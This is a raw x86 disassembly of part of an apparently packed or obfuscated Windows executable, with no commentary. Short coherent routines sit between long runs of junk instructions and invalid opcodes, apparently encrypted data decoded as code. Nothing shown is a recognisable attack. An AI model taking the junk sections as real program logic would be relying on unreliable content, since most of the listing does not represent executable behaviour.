  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43376f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43372f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407496:	bound  edx,QWORD PTR [esi+0x7ec0a464]
  40749c:	jle    0x4074be
  40749e:	jge    0x40751e
  4074a0:	jle    0x4074e5
  4074a2:	xchg   esi,eax
  4074a3:	nop
  4074a4:	mov    al,0xb0
  4074a6:	xchg   DWORD PTR [edx+0x284dc10d],ecx
  4074ac:	cs inc ebx
  4074ae:	inc    edi
  4074af:	mov    dl,0x60
  4074b1:	jmp    0x9aeb:0xeb3bb756
  4074b8:	scas   al,BYTE PTR es:[edi]
  4074b9:	retf   0x1545
  4074bc:	push   ss
  4074bd:	jne    0x407514
  4074bf:	add    ecx,DWORD PTR ds:0xaff14f6b
  4074c5:	dec    edi
  4074c6:	mov    bl,bh
  4074c8:	lods   eax,DWORD PTR ds:[esi]
  4074c9:	pop    esi
  4074ca:	das    
  4074cb:	jg     0x4074c0
  4074cd:	inc    eax
  4074ce:	add    esp,DWORD PTR [esi]
  4074d0:	mov    ah,0xb3
  4074d2:	ds xor al,0xbb
  4074d5:	mov    ebx,0xbab96618
  4074da:	(bad)  
  4074db:	sar    esp,cl
  4074dd:	or     ebx,edi
  4074df:	sar    DWORD PTR [eax+0x937e181],1
  4074e5:	das    
  4074e6:	inc    ebx
  4074e7:	or     al,0x7c
  4074e9:	iret   
  4074ea:	xor    BYTE PTR [ecx],dl
  4074ec:	scas   eax,DWORD PTR es:[edi]
  4074ed:	mov    al,ds:0xf26e2e69
  4074f2:	jns    0x407529
  4074f4:	mov    edi,0x3145e339
  4074f9:	out    0x63,al
  4074fb:	jnp    0x4074e0
  4074fd:	stc    
  4074fe:	or     eax,0x680b69ca
  407503:	mov    ds:0xf3e06b62,eax
  407508:	cmp    ecx,ebp
  40750a:	fst    QWORD PTR ds:0x9c8b945e
  407510:	cwde   
  407511:	adc    cl,bl
  407513:	pushf  
  407514:	jns    0x4074fb
  407516:	imul   ebp,ebx,0xffffffa8
  407519:	data16 (bad) 
  40751c:	pushf  
  40751d:	add    al,0x57
  40751f:	pop    ss
  407520:	jne    0x407526
  407522:	lods   eax,DWORD PTR ds:[esi]
  407523:	pop    esi
  407524:	frstor [ecx]
  407526:	(bad)  
  407527:	adc    al,0x50
  407529:	call   0xa98d:0x6a43feac
  407530:	pop    esp
  407531:	adc    dh,BYTE PTR [esi-0x6f20e488]
  407537:	mov    ecx,0x9133f72c
  40753d:	in     eax,0x2a
  40753f:	daa    
  407540:	inc    ebp
  407541:	imul   dh
  407543:	enter  0xded0,0x4b
  407547:	push   ebp
  407548:	xor    BYTE PTR [ecx],bh
  40754a:	mov    esp,DWORD PTR [edi]
  40754c:	out    0x9d,al
  40754e:	pop    eax
  40754f:	push   esi
  407550:	cs jg  0x407534
  407553:	jno    0x40758b
  407555:	inc    edi
  407556:	xchg   ecx,eax
  407557:	neg    ch
  407559:	in     eax,0x48
  40755b:	std    
  40755c:	sub    cl,bl
  40755e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40755f:	sub    ebx,esi
  407561:	pop    eax
  407562:	nop
  407563:	int3   
  407564:	(bad)  
  407565:	pop    esi
  407566:	pop    edi
  407567:	xchg   DWORD PTR [ebx+0x2fa24ade],edx
  40756d:	mov    al,ds:0xe0515bad
  407572:	ins    DWORD PTR es:[edi],dx
  407573:	js     0x407572
  407575:	jmp    0x2f429435
  40757a:	pushf  
  40757b:	mov    eax,0x90a1c2bd
  407580:	sahf   
  407581:	(bad)  
  407583:	pop    edi
  407584:	jo     0x4075ca
  407586:	enter  0x5335,0xcb
  40758a:	xchg   bl,dh
  40758c:	test   BYTE PTR [ecx],dh
  40758e:	cmp    ebp,DWORD PTR [edx]
  407590:	imul   ecx,esi,0x51
  407593:	jle    0x407567
  407595:	adc    edi,DWORD PTR [edx+ecx*1]
  407598:	repnz in eax,dx
  40759a:	mov    esp,0x85ea04e2
  40759f:	push   es
  4075a0:	out    dx,al
  4075a1:	adc    al,0x8a
  4075a3:	push   ecx
  4075a4:	mul    BYTE PTR [ecx]
  4075a6:	mov    BYTE PTR [edi+0x23],bh
  4075a9:	mov    ds:0x1bdad2d6,al
  4075ae:	jle    0x4075ce
  4075b0:	sahf   
  4075b1:	add    ebp,DWORD PTR [edi]
  4075b3:	pop    eax
  4075b4:	and    eax,0xa75a83c0
  4075b9:	and    cl,BYTE PTR [edi-0x68bf543b]
  4075bf:	lods   eax,DWORD PTR ds:[esi]
  4075c0:	data16 aas 
  4075c2:	sub    dl,BYTE PTR [ecx-0x1804852]
  4075c8:	pop    ebp
  4075c9:	xor    eax,0x8689ddf
  4075ce:	int3   
  4075cf:	std    
  4075d0:	les    edi,FWORD PTR [edx-0x153150a]
  4075d6:	jp     0x407653
  4075d8:	xor    BYTE PTR [ebx+eax*1-0x5e],al
  4075dc:	adc    cl,BYTE PTR [ebx+esi*1+0xe]
  4075e0:	dec    ebx
  4075e1:	or     esp,esi
  4075e3:	push   edi
  4075e4:	jl     0x407580
  4075e6:	lods   al,BYTE PTR ds:[esi]
  4075e7:	iret   
  4075e8:	pop    esp
  4075e9:	pop    edx
  4075ea:	pop    esi
  4075eb:	in     eax,dx
  4075ec:	lock mov cl,0x16
  4075ef:	cmp    DWORD PTR [ecx+0x71d238cb],ecx
  4075f5:	jne    0x40763f
  4075f7:	js     0x407658
  4075f9:	enter  0x860b,0xa4
  4075fd:	xchg   BYTE PTR ds:0xf4c73c2e,al
  407603:	and    DWORD PTR [esp+eax*4+0x62],ecx
  407607:	jp     0x40765a
  407609:	inc    edi
  40760a:	mov    ch,0xdc
  40760c:	cmp    ah,bl
  40760e:	cdq    
  40760f:	out    dx,eax
  407610:	mov    BYTE PTR [edi+edi*8+0xed5e8ba],0xa
  407618:	mov    eax,ds:0xcb55cb43
  40761d:	xor    eax,0xefe67070
  407622:	fbstp  TBYTE PTR [ebp+0x63]
  407625:	repnz lods al,BYTE PTR ds:[esi]
  407627:	mov    ebx,0xa342120c
  40762c:	out    dx,al
  40762d:	jg     0x40768d
  40762f:	xor    DWORD PTR [eax+0x48f81cb9],edi
  407635:	sub    cl,BYTE PTR [ebx-0x7c]
  407638:	retf   
  407639:	es sbb ah,dh
  40763c:	jg     0x4075d9
  40763e:	mov    bh,BYTE PTR [ebp-0x65a3fcce]
  407644:	fs ds dec esp
  407647:	and    edx,ebp
  407649:	jae    0x407614
  40764b:	xchg   esp,eax
  40764c:	jns    0x4075ce
  40764e:	mov    ah,0xa9
  407650:	push   ss
  407651:	xchg   ebp,eax
  407652:	icebp  
  407653:	xor    al,0xad
  407655:	enter  0x553f,0x29
  407659:	push   ebp
  40765a:	rep ins DWORD PTR es:[edi],dx
  40765c:	mov    ds:0x14c19ec,eax
  407661:	sbb    eax,0xeee0393b
  407666:	push   ebx
  407667:	outs   dx,DWORD PTR ds:[esi]
  407668:	add    DWORD PTR ss:[ebp-0x17],0x5e4983e1
  407670:	xchg   DWORD PTR [esi+0x3f809c93],edx
  407676:	xor    al,bl
  407678:	fsubr  DWORD PTR [ebx]
  40767a:	jle    0x40765b
  40767c:	push   esi
  40767d:	out    dx,al
  40767e:	imul   ebp,DWORD PTR [esi+0x312b994a],0xffffffad
  407685:	mov    al,ds:0xf12941eb
  40768a:	jo     0x407689
  40768c:	imul   esi,DWORD PTR [eax],0x98ef7a72
  407692:	imul   esi,DWORD PTR [eax],0xffffffe2
  407695:	icebp  
  407696:	cs (bad) 
  407698:	mov    edx,0x4193131e
  40769d:	mov    fs,WORD PTR [ebp+0x1b10d91c]
  4076a3:	call   0x2a5c:0x84b06f25
  4076aa:	scas   eax,DWORD PTR es:[edi]
  4076ab:	push   es
  4076ac:	es out dx,al
  4076ae:	sub    bh,BYTE PTR [ecx]
  4076b0:	out    0xc,eax
  4076b2:	gs shl esi,0x65
  4076b6:	fnsave [ecx-0x5b]
  4076b9:	int3   
  4076ba:	daa    
  4076bb:	iret   
  4076bc:	sbb    bl,BYTE PTR [edi+eax*4]
  4076bf:	sar    BYTE PTR [ebp+0x36],1
  4076c2:	jns    0x4076b3
  4076c4:	popf   
  4076c5:	ins    BYTE PTR es:[edi],dx
  4076c6:	test   eax,0x8063f7a7
  4076cb:	dec    ecx
  4076cc:	xlat   BYTE PTR ds:[ebx]
  4076cd:	shl    DWORD PTR [ebp+ecx*8-0x1044ce94],0x80
  4076d5:	xchg   ebp,eax
  4076d6:	fs aad 0xc9
  4076d9:	push   ebx
  4076da:	rcl    BYTE PTR [esp+edi*1+0x3b338797],0x19
  4076e2:	scas   al,BYTE PTR es:[edi]
  4076e3:	icebp  
  4076e4:	mov    edx,0x538fab84
  4076e9:	and    BYTE PTR [esi],0xb8
  4076ec:	cwde   
  4076ed:	mov    dl,0x57
  4076ef:	shr    BYTE PTR [ecx-0x6373c15a],1
  4076f5:	mov    esp,0x45c1e30b
  4076fa:	push   ds
  4076fb:	out    dx,eax
  4076fc:	or     DWORD PTR [ebx],0xffffff98
  4076ff:	hlt    
  407700:	loope  0x4076ed
  407702:	jp     0x40774a
  407704:	ret    0x5e8e
  407707:	lods   al,BYTE PTR ds:[esi]
  407708:	pop    ebp
  407709:	clc    
  40770a:	arpl   WORD PTR [esi+0x4aa67aca],di
  407710:	jno    0x4076e7
  407712:	xchg   ebp,eax
  407713:	leave  
  407714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407715:	inc    edi
  407716:	in     eax,0x61
  407718:	jb     0x4076ba
  40771a:	lock in al,0x3c
  40771d:	lds    eax,FWORD PTR [ecx-0xd]
  407720:	push   0x33168e5f
  407725:	dec    esp
  407726:	retf   
  407727:	ficom  WORD PTR [ecx+ebx*4]
  40772a:	jg     0x4076b8
  40772c:	cwde   
  40772d:	or     ebx,DWORD PTR [esi-0x20b901b6]
  407733:	dec    esp
  407734:	sbb    BYTE PTR [edx+0x71],bh
  407737:	fsub   QWORD PTR [eax-0x36]
  40773a:	idiv   bh
  40773c:	jae    0x40771b
  40773e:	push   eax
  40773f:	mov    eax,0x6679bd2
  407744:	daa    
  407745:	pop    esi
  407746:	pop    esp
  407747:	push   0xe0c9938c
  40774c:	jmp    0x407722
  40774e:	push   cs
  40774f:	jmp    FWORD PTR [eax-0x770e314a]
  407755:	jge    0x407719
  407757:	outs   dx,DWORD PTR ds:[esi]
  407758:	jmp    0xc39889a6
  40775d:	fsub   QWORD PTR [edx]
  40775f:	out    dx,al
  407760:	ja     0x407729
  407762:	jp     0x407765
  407764:	xchg   esp,eax
  407765:	les    eax,FWORD PTR [eax-0x7a]
  407768:	pop    eax
  407769:	ds inc edx
  40776b:	jo     0x4076f6
  40776d:	loope  0x4077eb
  40776f:	push   ss
  407770:	sar    DWORD PTR [esi-0x613d91d8],0x98
  407777:	scas   al,BYTE PTR es:[edi]
  407778:	arpl   WORD PTR [ecx-0x4218518],di
  40777e:	pop    esp
  40777f:	lock fdiv QWORD PTR [esi+0x11]
  407783:	fbld   TBYTE PTR [eax+0x7d]
  407786:	stc    
  407787:	daa    
  407788:	scas   eax,DWORD PTR es:[edi]
  407789:	pop    ss
  40778a:	shr    BYTE PTR [ecx-0x6b],1
  40778d:	lock cmp BYTE PTR [ecx-0x197fabed],al
  407794:	add    al,0x83
  407796:	enter  0x894e,0xe9
  40779a:	inc    edx
  40779b:	or     al,0x29
  40779d:	push   ebx
  40779e:	xchg   edi,eax
  40779f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077a0:	xchg   ebp,eax
  4077a1:	scas   eax,DWORD PTR es:[edi]
  4077a2:	inc    edx
  4077a3:	call   0x82946135
  4077a8:	inc    esi
  4077a9:	mov    edx,0xacb7e4bc
  4077ae:	mov    ecx,0xb0e97daf
  4077b3:	mov    edx,0x355ab87b
  4077b8:	dec    edi
  4077b9:	or     eax,0xa2bdbad1
  4077be:	jbe    0x407768
  4077c0:	mov    ebx,0x1b647f7d
  4077c5:	pop    ds
  4077c6:	and    ebp,DWORD PTR [bx+di-0x54]
  4077ca:	leave  
  4077cb:	mov    edi,0x8b10aea0
  4077d0:	dec    ebp
  4077d1:	cld    
  4077d2:	mov    DWORD PTR ds:0x4337a7,0x5e65
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	pop    esi
  4077f5:	cdq    
  4077f6:	dec    ebp
  4077f7:	xlat   BYTE PTR ds:[ebx]
  4077f8:	push   esi
  4077f9:	iret   
  4077fa:	jle    0x40787a
  4077fc:	and    BYTE PTR [ebp+0x7e],bh
  4077ff:	jle    0x407785
  407801:	pushf  
  407802:	retf   0x78cb
  407805:	mov    gs,WORD PTR [ecx+0x51beacfc]
  40780b:	rcl    BYTE PTR [ecx+0x3afe3259],cl
  407811:	adc    DWORD PTR [ebp+0x17],esp
  407814:	sub    ecx,DWORD PTR [edi-0x2f5de352]
  40781a:	out    0xa3,eax
  40781c:	jo     0x407863
  40781e:	pop    ecx
  40781f:	test   al,0x33
  407821:	mov    dl,0x91
  407823:	inc    edx
  407824:	popa   
  407825:	ins    BYTE PTR es:[di],dx
  407827:	xchg   esi,eax
  407828:	mov    ecx,0xd688b79f
  40782d:	mov    edi,0xec617f3e
  407832:	inc    ecx
  407833:	push   eax
  407834:	inc    edx
  407835:	mul    BYTE PTR ds:0xb80ca1c6
  40783b:	dec    esp
  40783c:	les    edi,FWORD PTR [eax-0x20]
  40783f:	mov    ecx,0xebc0e2e0
  407844:	jno    0x4078a0
  407846:	inc    edx
  407847:	sbb    ecx,esp
  407849:	(bad)  
  40784a:	adc    ebp,DWORD PTR [ecx-0x25]
  40784d:	dec    ebx
  40784e:	adc    edx,DWORD PTR [eax]
  407850:	int    0x8
  407852:	les    ebx,FWORD PTR [edi+0x24bc5cf0]
  407858:	xor    al,0xb9
  40785a:	test   eax,0x4a55cd2
  40785f:	sub    BYTE PTR [ebx+0x5124bdcc],ah
  407865:	add    DWORD PTR [esi+0x23a80912],eax
  40786b:	aam    0x2e
  40786d:	sub    BYTE PTR [ebp+0x701694cf],dh
  407873:	xchg   BYTE PTR [ebp-0x346a449f],dh
  407879:	add    bl,ah
  40787b:	sahf   
  40787c:	inc    ebp
  40787d:	xor    cl,BYTE PTR fs:[edx]
  407880:	jo     0x40783e
  407882:	lahf   
  407883:	outs   dx,BYTE PTR ds:[esi]
  407884:	jecxz  0x407841
  407886:	rol    DWORD PTR [ecx-0x2c],cl
  407889:	jg     0x40789e
  40788b:	pop    eax
  40788c:	lods   al,BYTE PTR ds:[esi]
  40788d:	jne    0x40787c
  40788f:	sbb    DWORD PTR [ecx+eiz*8-0x1af42587],0xec96c56b
  40789a:	jg     0x4078d7
  40789c:	adc    dh,bh
  40789e:	scas   al,BYTE PTR es:[edi]
  40789f:	or     eax,0xfc477530
  4078a4:	sar    BYTE PTR [edi-0x44],0xf0
  4078a8:	addr16 inc ebx
  4078aa:	jmp    0x4078f9
  4078ac:	aad    0xa0
  4078ae:	add    BYTE PTR [edi-0x1c66d8fb],ch
  4078b4:	js     0x407865
  4078b6:	inc    edi
  4078b7:	scas   eax,DWORD PTR es:[edi]
  4078b8:	test   DWORD PTR [ebp+0x1a],edx
  4078bb:	or     DWORD PTR [ebp-0x1c],0x28
  4078bf:	adc    al,0x58
  4078c1:	mov    edi,ebx
  4078c3:	sub    dl,bh
  4078c5:	push   ss
  4078c6:	jg     0x4078bd
  4078c8:	jecxz  0x4078b5
  4078ca:	(bad)  
  4078cb:	jb     0x407867
  4078cd:	das    
  4078ce:	fcmovnbe st,st(0)
  4078d0:	and    al,0xf8
  4078d2:	js     0x407918
  4078d4:	iret   
  4078d5:	fstp   QWORD PTR ds:0x64eb73a3
  4078db:	aam    0x48
  4078dd:	sub    al,al
  4078df:	test   BYTE PTR [eax-0xb51261],0x7f
  4078e6:	mov    ecx,0xa26a566a
  4078eb:	sar    BYTE PTR [edx+0x49349af7],1
  4078f1:	jge    0x407965
  4078f3:	pop    ecx
  4078f4:	xchg   ecx,esi
  4078f6:	mov    bl,0x3
  4078f8:	ds cmp al,ah
  4078fb:	fnstcw WORD PTR [ebp+eiz*2-0x57493245]
  407902:	fadd   QWORD PTR [ebp+0x6037605b]
  407908:	(bad)  
  407909:	in     eax,dx
  40790a:	cmp    DWORD PTR [edx+0x3a],esi
  40790d:	sub    ecx,DWORD PTR [ebp+0x5b]
  407910:	or     ch,ah
  407912:	js     0x407979
  407914:	or     dl,ch
  407916:	out    dx,eax
  407917:	jmp    0xc5ba:0xe5e05afa
  40791e:	and    al,BYTE PTR [ebp+0x4d2264e0]
  407924:	dec    ecx
  407925:	aad    0x26
  407927:	out    0xfa,al
  407929:	sub    DWORD PTR [edx+0x30],ebx
  40792c:	inc    edx
  40792d:	jge    0x4078f0
  40792f:	(bad)  
  407930:	dec    esi
  407931:	pop    ebp
  407932:	out    0x54,al
  407934:	mov    al,ds:0x832fc83
  407939:	maskmovq mm2,(bad)
  40793a:	not    DWORD PTR [ebp-0x5b]
  40793d:	mov    ebx,ss
  40793f:	xor    ecx,ecx
  407941:	xchg   ecx,eax
  407942:	push   eax
  407943:	xlat   BYTE PTR ds:[ebx]
  407944:	int    0x96
  407946:	sub    BYTE PTR [ebp+0x475c32db],bh
  40794c:	in     eax,dx
  40794d:	out    0xba,al
  40794f:	loopne 0x4079b8
  407951:	xor    BYTE PTR [esp+ebx*2+0x2793c97c],bl
  407958:	sub    ebx,DWORD PTR [eax+0x1f]
  40795b:	adc    eax,DWORD PTR [edi]
  40795d:	adc    ecx,ecx
  40795f:	lods   al,BYTE PTR ds:[esi]
  407960:	inc    eax
  407961:	sub    eax,0xce9c9045
  407966:	imul   esi,DWORD PTR [esi+eax*4-0x4],0x46
  40796b:	adc    eax,0x8e5ef6bb
  407970:	scas   al,BYTE PTR es:[edi]
  407971:	ja     0x407926
  407973:	stos   BYTE PTR es:[edi],al
  407974:	xchg   ebp,eax
  407975:	jge    0x40798c
  407977:	xchg   ecx,eax
  407978:	sbb    BYTE PTR cs:[ecx],0xf7
  40797c:	adc    ah,ah
  40797e:	push   ss
  40797f:	adc    eax,0xf391526d
  407984:	ss jmp 0x407911
  407987:	or     al,BYTE PTR [esi+edx*8+0x2a428867]
  40798e:	test   al,dl
  407990:	jecxz  0x4079db
  407992:	stc    
  407993:	sub    BYTE PTR [eax+ebp*1-0x7f],bh
  407997:	xor    dl,0x18
  40799a:	pop    ecx
  40799b:	pop    eax
  40799c:	(bad)  
  40799d:	loop   0x40797c
  40799f:	xchg   bl,ch
  4079a1:	retf   
  4079a2:	sbb    al,0x6b
  4079a4:	or     BYTE PTR [edx-0x5ddb8052],al
  4079aa:	push   edx
  4079ab:	daa    
  4079ac:	iret   
  4079ad:	sar    BYTE PTR [ebx-0x6e4f19ad],cl
  4079b3:	or     edx,DWORD PTR [esi]
  4079b5:	fdiv   QWORD PTR [esi-0x5e]
  4079b8:	(bad)  
  4079b9:	test   DWORD PTR [ebp-0x1b],ecx
  4079bc:	mov    al,0x6d
  4079be:	test   WORD PTR [edx-0x43],0xce2c
  4079c4:	out    0xe9,al
  4079c6:	loop   0x40797e
  4079c8:	(bad)  
  4079c9:	push   esi
  4079ca:	cli    
  4079cb:	mov    eax,ds:0xc2e8d5ca
  4079d0:	cmp    al,0xde
  4079d2:	xor    eax,0x71c97305
  4079d7:	jmp    0x88ba:0x660c9ac5
  4079de:	in     eax,dx
  4079df:	mov    ebx,esi
  4079e1:	mov    al,0xdf
  4079e3:	mov    WORD PTR [ebx+0x6c9b0d8a],?
  4079e9:	aas    
  4079ea:	cmp    DWORD PTR [edx-0x5d83a049],0xd6016ca9
  4079f4:	je     0x407995
  4079f6:	push   edx
  4079f7:	repz or BYTE PTR [edi-0x5d33faa0],ch
  4079fe:	inc    ebx
  4079ff:	mov    edi,gs
  407a01:	adc    BYTE PTR [ebx+0x37082cd2],bl
  407a07:	enter  0x99ff,0xdc
  407a0b:	daa    
  407a0c:	lods   eax,DWORD PTR ds:[esi]
  407a0d:	xchg   esp,eax
  407a0e:	jno    0x4079be
  407a10:	and    BYTE PTR [edi-0x1c729b0d],dh
  407a16:	mov    ds:0x37de6ec7,al
  407a1b:	xlat   BYTE PTR ds:[ebx]
  407a1c:	push   0x7a
  407a1e:	js     0x4079c3
  407a20:	retf   
  407a21:	mov    BYTE PTR [esi],ch
  407a23:	jecxz  0x407a24
  407a25:	xlat   BYTE PTR ds:[ebx]
  407a26:	out    0xa1,eax
  407a28:	out    dx,eax
  407a29:	jl     0x407a05
  407a2b:	shl    eax,0xd7
  407a2e:	mov    ecx,0x9e19f4fb
  407a33:	xchg   esi,eax
  407a34:	sub    DWORD PTR [ecx],0x2ec37ce7
  407a3a:	rcl    DWORD PTR gs:[esi+0x36],0xe5
  407a3f:	stc    
  407a40:	in     eax,dx
  407a41:	cmp    BYTE PTR [edi+0x6a],ah
  407a44:	mov    ebx,0x880cc9e3
  407a49:	stc    
  407a4a:	add    ecx,eax
  407a4c:	xor    BYTE PTR [edi-0x25c7819e],bh
  407a52:	jb     0x4079f6
  407a54:	push   esi
  407a55:	xor    ebp,esi
  407a57:	xchg   esp,eax
  407a58:	inc    esp
  407a59:	xor    esi,DWORD PTR [ebx+0x55]
  407a5c:	push   cs
  407a5d:	jmp    0x1110eddd
  407a62:	pop    esp
  407a63:	cmp    ebp,0x3d
  407a66:	enter  0x9a47,0x9a
  407a6a:	jb     0x407a4e
  407a6c:	add    eax,0xf3412b42
  407a71:	and    eax,0xe8836f28
  407a76:	add    esp,DWORD PTR [ebx]
  407a78:	(bad)  
  407a79:	out    dx,eax
  407a7a:	leave  
  407a7b:	ins    DWORD PTR es:[edi],dx
  407a7c:	sub    al,0xb1
  407a7e:	mov    ebx,0xa7279732
  407a83:	arpl   WORD PTR [esi+0x2f],cx
  407a86:	xchg   edi,eax
  407a87:	scas   eax,DWORD PTR es:[edi]
  407a88:	stos   DWORD PTR es:[edi],eax
  407a89:	add    DWORD PTR [esi+0x62],edi
  407a8c:	loop   0x407a2c
  407a8e:	and    eax,0x9793660f
  407a93:	outs   dx,BYTE PTR ds:[esi]
  407a94:	adc    eax,0xbee86640
  407a99:	test   eax,0x746371a0
  407a9e:	dec    ebp
  407a9f:	or     DWORD PTR [eax],ecx
  407aa1:	push   edx
  407aa2:	cmp    al,bh
  407aa4:	pop    ebp
  407aa5:	mov    bh,BYTE PTR [esi-0xc]
  407aa8:	cs jge 0x407a3c
  407aab:	pop    edx
  407aac:	shufps xmm3,XMMWORD PTR [esi-0x40],0xf4
  407ab1:	retf   
  407ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ab3:	pop    esp
  407ab4:	push   ecx
  407ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ab6:	lock ins BYTE PTR es:[edi],dx
  407ab8:	push   ecx
  407ab9:	jo     0x407b39
  407abb:	dec    edx
  407abc:	mov    ds:0xea3bc7e0,al
  407ac1:	pop    ds
  407ac2:	test   al,0x54
  407ac4:	xchg   ebx,eax
  407ac5:	sub    DWORD PTR [ebp+0x2],esi
  407ac8:	retf   0x5ee7
  407acb:	mov    al,BYTE PTR [esi+0x2]
  407ace:	and    ebp,esp
  407ad0:	xor    DWORD PTR [eax],esi
  407ad2:	mov    ecx,0x15f36a65
  407ad7:	push   0xffffffbe
  407ad9:	retf   
  407ada:	aas    
  407adb:	aad    0x98
  407add:	xchg   edi,eax
  407ade:	jg     0x407a7d
  407ae0:	pop    esi
  407ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ae2:	sbb    al,0x1a
  407ae4:	dec    edi
  407ae5:	mov    WORD PTR [ecx],ss
  407ae7:	cld    
  407ae8:	mov    ds:0x5f3312eb,al
  407aed:	scas   al,BYTE PTR es:[edi]
  407aee:	int3   
  407aef:	pusha  
  407af0:	pop    ebp
  407af1:	js     0x407b0e
  407af3:	jbe    0x407a87
  407af5:	dec    edx
  407af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407af7:	out    dx,al
  407af8:	retf   0xe56f
  407afb:	pop    eax
  407afc:	test   al,0x32
  407afe:	push   edi
  407aff:	xchg   ebx,eax
  407b00:	aaa    
  407b01:	sahf   
  407b02:	and    DWORD PTR ds:0xab590eaa,edx
  407b08:	call   0xf55feb33
  407b0d:	sbb    bl,dh
  407b0f:	or     DWORD PTR [edx-0x24],ebx
  407b12:	in     al,0x20
  407b14:	jecxz  0x407b7c
  407b16:	ret    
  407b17:	push   ss
  407b18:	add    BYTE PTR [ecx*2-0x6b46b561],bh
  407b1f:	mov    edi,0x1e16622e
  407b24:	inc    ebp
  407b25:	loop   0x407ad3
  407b27:	inc    edx
  407b28:	xchg   esi,eax
  407b29:	into   
  407b2a:	dec    esi
  407b2b:	cwde   
  407b2c:	push   0xffffffd8
  407b2e:	cmp    ecx,eax
  407b30:	jne    0x407efc
  407b36:	mov    ax,WORD PTR [ebp-0x8]
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433723,0x433767
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433803,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43372b,0x433827
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43383b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4337fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0x86f6a3a4,al
  407ba8:	mov    ds:0xcb785c38,al
  407bad:	jle    0x407c2d
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407bae
  407bb4:	loop   0x407c15
  407bb6:	in     eax,0x28
  407bb8:	pop    eax
  407bb9:	jne    0x407c0a
  407bbb:	loopne 0x407b72
  407bbd:	imul   eax,DWORD PTR [ecx],0xaf000620
  407bc3:	jge    0x407c15
  407bc5:	and    edi,esp
  407bc7:	mov    bh,0x37
  407bc9:	push   0xffffff8a
  407bcb:	cmp    BYTE PTR [ecx],dl
  407bcd:	int    0x66
  407bcf:	mov    esp,0xfb414ef3
  407bd4:	sub    al,0xca
  407bd6:	fdivr  DWORD PTR [ebp+0x744a5981]
  407bdc:	ffree  st(3)
  407bde:	mov    es,WORD PTR [edi+0x6f]
  407be1:	jg     0x407be6
  407be3:	xlat   BYTE PTR ds:[ebx]
  407be4:	out    dx,eax
  407be5:	pop    es
  407be6:	test   al,0xdb
  407be8:	jg     0x407b8d
  407bea:	pop    eax
  407beb:	and    cl,0x94
  407bee:	mov    WORD PTR [ebx-0x32],fs
  407bf1:	lods   al,BYTE PTR ds:[esi]
  407bf2:	daa    
  407bf3:	ds dec edi
  407bf5:	mov    cl,0x5f
  407bf7:	jmp    0xe172c0d6
  407bfc:	sbb    al,0x48
  407bfe:	call   0x4159:0x9903f12b
  407c05:	iret   
  407c06:	test   ebx,edx
  407c08:	and    BYTE PTR [esi],al
  407c0a:	mov    ebp,0xd774ac6
  407c0f:	stos   DWORD PTR es:[edi],eax
  407c10:	adc    BYTE PTR [edi+0xb07e7a0],bh
  407c16:	adc    dl,al
